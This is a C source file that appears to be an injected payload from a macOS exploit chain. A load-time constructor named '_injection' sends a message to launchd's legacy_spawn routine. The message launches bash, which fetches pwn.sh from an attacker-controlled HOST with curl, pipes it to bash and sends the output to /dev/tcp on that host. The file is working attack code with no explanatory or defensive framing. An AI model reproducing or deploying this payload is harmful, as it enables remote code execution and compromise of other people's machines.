#include <stdlib.h>

#include <spc.h>

void* build_command_buf(int argc, const char** argv)
{
    size_t size = 0xa1;
    size += strlen(argv[0]) + 1;
    for (int i = 0; i < argc; i++) {
        size += strlen(argv[i]) + 1;
    }
    size += 3;

    int* buf = malloc(size);
    memset(buf, 0, size);

    buf[0] = size;
    buf[4] = argc;
    buf[5] = strlen(argv[0]) + 1;
    buf[7] = size - 0xa4;
    buf[27] = 0x100;

    size_t pos = 0xa1;
    strcpy((char*)buf + pos, argv[0]);
    pos += strlen(argv[0]) + 1;
    for (int i = 0; i < argc; i++) {
        strcpy((char*)buf + pos, argv[i]);
        pos += strlen(argv[i]) + 1;
    }

    return buf;
}

__attribute__((constructor))
void _injection()
{
    spc_dictionary_t* msg = spc_dictionary_create();
    spc_dictionary_set_uint64(msg, "type", 7);
    spc_dictionary_set_uint64(msg, "handle", 0);
    spc_dictionary_set_string(msg, "label", "Pwnculator");

    const char* argv[] = {
        "/bin/bash",
        "-c",
        "curl http://" HOST ":" HTTP_PORT "/pwn.sh | bash > /dev/tcp/" HOST "/" TCPLOG_PORT " 2>&1",
    };

    int* attr = build_command_buf(sizeof(argv) / sizeof(const char*), argv);
    spc_dictionary_set_data(msg, "attr", attr, attr[0]);

    spc_dictionary_t* reply = NULL;

    // Send the message to launchd (via the bootstrap port). To subsytem 3, routine "legacy_spawn" (0x331)
    spc_interface_routine(3, 0x331, msg, &reply);
}
